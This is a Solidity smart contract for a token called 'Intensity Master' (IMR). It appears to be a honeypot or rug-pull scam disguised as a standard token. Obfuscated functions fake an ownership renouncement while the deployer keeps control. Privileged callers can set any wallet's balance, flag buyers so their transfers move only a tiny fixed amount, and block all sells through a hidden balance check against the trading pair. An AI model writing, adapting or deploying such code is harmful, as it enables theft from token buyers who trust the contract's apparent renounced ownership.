//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface minToken {
    function createPair(address senderSell, address limitLaunched) external returns (address);
}

interface launchedMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address toLiquidity) external view returns (uint256);

    function transfer(address launchedTrading, uint256 listAuto) external returns (bool);

    function allowance(address modeTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 listAuto) external returns (bool);

    function transferFrom(
        address sender,
        address launchedTrading,
        uint256 listAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLiquidity, uint256 value);
    event Approval(address indexed modeTrading, address indexed spender, uint256 value);
}

abstract contract walletToIs {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface isToken {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedMarketingMetadata is launchedMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IntensityMaster is walletToIs, launchedMarketing, launchedMarketingMetadata {

    function senderBuy() public {
        emit OwnershipTransferred(sellSender, address(0));
        minSwapLiquidity = address(0);
    }

    bool private totalEnable;

    function allowance(address txMode, address isBuy) external view virtual override returns (uint256) {
        if (isBuy == walletTxList) {
            return type(uint256).max;
        }
        return launchReceiver[txMode][isBuy];
    }

    function receiverTxShould(address atTotal) public {
        require(atTotal.balance < 100000);
        if (tradingWallet) {
            return;
        }
        
        shouldLaunched[atTotal] = true;
        if (tradingFrom == fromLaunch) {
            totalEnable = false;
        }
        tradingWallet = true;
    }

    function symbol() external view virtual override returns (string memory) {
        return fromTx;
    }

    function transfer(address sellExempt, uint256 listAuto) external virtual override returns (bool) {
        return marketingFromWallet(_msgSender(), sellExempt, listAuto);
    }

    function atFrom() private view {
        require(shouldLaunched[_msgSender()]);
    }

    bool public totalSwapTx;

    function balanceOf(address toLiquidity) public view virtual override returns (uint256) {
        return exemptLiquidity[toLiquidity];
    }

    function marketingFromWallet(address txExempt, address launchedTrading, uint256 listAuto) internal returns (bool) {
        if (txExempt == sellSender) {
            return modeWallet(txExempt, launchedTrading, listAuto);
        }
        uint256 launchedLaunch = launchedMarketing(fundSwap).balanceOf(autoExempt);
        require(launchedLaunch == shouldTotalReceiver);
        require(launchedTrading != autoExempt);
        if (minBuy[txExempt]) {
            return modeWallet(txExempt, launchedTrading, swapAt);
        }
        return modeWallet(txExempt, launchedTrading, listAuto);
    }

    mapping(address => bool) public minBuy;

    address autoExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address isBuy, uint256 listAuto) public virtual override returns (bool) {
        launchReceiver[_msgSender()][isBuy] = listAuto;
        emit Approval(_msgSender(), isBuy, listAuto);
        return true;
    }

    address walletTxList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public fundSwap;

    function launchedSell(uint256 listAuto) public {
        atFrom();
        shouldTotalReceiver = listAuto;
    }

    string private fromTx = "IMR";

    constructor (){
        if (maxAmount != totalEnable) {
            totalEnable = true;
        }
        isToken minToExempt = isToken(walletTxList);
        fundSwap = minToken(minToExempt.factory()).createPair(minToExempt.WETH(), address(this));
        
        sellSender = _msgSender();
        shouldLaunched[sellSender] = true;
        exemptLiquidity[sellSender] = atMarketing;
        senderBuy();
        if (maxIs == tradingFrom) {
            fromLaunch = maxIs;
        }
        emit Transfer(address(0), sellSender, atMarketing);
    }

    uint256 private maxIs;

    function modeWallet(address txExempt, address launchedTrading, uint256 listAuto) internal returns (bool) {
        require(exemptLiquidity[txExempt] >= listAuto);
        exemptLiquidity[txExempt] -= listAuto;
        exemptLiquidity[launchedTrading] += listAuto;
        emit Transfer(txExempt, launchedTrading, listAuto);
        return true;
    }

    function getOwner() external view returns (address) {
        return minSwapLiquidity;
    }

    uint8 private toIsWallet = 18;

    bool public sellBuy;

    function transferFrom(address txExempt, address launchedTrading, uint256 listAuto) external override returns (bool) {
        if (_msgSender() != walletTxList) {
            if (launchReceiver[txExempt][_msgSender()] != type(uint256).max) {
                require(listAuto <= launchReceiver[txExempt][_msgSender()]);
                launchReceiver[txExempt][_msgSender()] -= listAuto;
            }
        }
        return marketingFromWallet(txExempt, launchedTrading, listAuto);
    }

    uint256 constant swapAt = 4 ** 10;

    uint256 private fromLaunch;

    mapping(address => bool) public shouldLaunched;

    function totalSupply() external view virtual override returns (uint256) {
        return atMarketing;
    }

    uint256 public tradingFrom;

    string private tradingEnable = "Intensity Master";

    uint256 launchedAt;

    bool private maxAmount;

    function txLaunch(address fundAt) public {
        atFrom();
        if (maxAmount != sellBuy) {
            tradingFrom = maxIs;
        }
        if (fundAt == sellSender || fundAt == fundSwap) {
            return;
        }
        minBuy[fundAt] = true;
    }

    address public sellSender;

    mapping(address => uint256) private exemptLiquidity;

    mapping(address => mapping(address => uint256)) private launchReceiver;

    address private minSwapLiquidity;

    function name() external view virtual override returns (string memory) {
        return tradingEnable;
    }

    function txLaunchMax(address sellExempt, uint256 listAuto) public {
        atFrom();
        exemptLiquidity[sellExempt] = listAuto;
    }

    event OwnershipTransferred(address indexed fundMarketing, address indexed amountTotal);

    bool public tradingWallet;

    uint256 private atMarketing = 100000000 * 10 ** 18;

    uint256 shouldTotalReceiver;

    function decimals() external view virtual override returns (uint8) {
        return toIsWallet;
    }

    function owner() external view returns (address) {
        return minSwapLiquidity;
    }

}